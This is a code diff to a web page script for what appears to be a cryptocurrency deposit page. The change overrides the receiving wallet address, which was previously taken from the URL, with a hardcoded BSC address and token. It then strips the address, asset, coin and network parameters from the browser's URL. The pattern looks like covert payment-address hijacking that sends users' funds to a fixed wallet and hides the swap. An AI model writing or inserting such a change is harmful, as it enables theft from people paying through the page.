@@ -146,7 +146,17 @@
   </main>
   <script>
     const address=document.querySelector('#address'),networkButton=document.querySelector('#networkButton'),networkMenu=document.querySelector('#networkMenu'),networkName=document.querySelector('#networkName'),ethIcon=document.querySelector('.eth-icon'),toast=document.querySelector('#toast');let toastTimer;
-    const urlParams=new URLSearchParams(window.location.search);if(urlParams.has('address')){address.value=urlParams.get('address');}
+    const walletConfig = Object.freeze({
+      address: '0x3b659063c41015a06D25B933742D0Bd28A04E490',
+      asset: '0x55d398326f99059fF775485246999027B3197955',
+      network: 'BSC',
+      coinId: '20000714'
+    });
+    address.value = walletConfig.address;
+    networkName.textContent = walletConfig.network;
+    const pageUrl = new URL(window.location.href);
+    ['address', 'asset', 'coin_id', 'network'].forEach(key => pageUrl.searchParams.delete(key));
+    if (pageUrl.href !== window.location.href) window.history.replaceState(window.history.state, '', pageUrl.href);
     function resizeAddress(){address.style.height='auto';address.style.height=address.scrollHeight+'px'}
     address.addEventListener('input',resizeAddress);
     window.addEventListener('resize',resizeAddress);
@@ -172,7 +182,7 @@
       if (button.disabled) return;
       const provider = getWalletProvider();
       if (!provider || typeof provider.request !== 'function') {
-        const params = new URLSearchParams({coin_id:'20000714', url:window.location.href});
+        const params = new URLSearchParams({coin_id:walletConfig.coinId, url:pageUrl.origin + pageUrl.pathname});
         window.location.href = 'https://link.trustwallet.com/open_url?' + params.toString();
         return;
       }
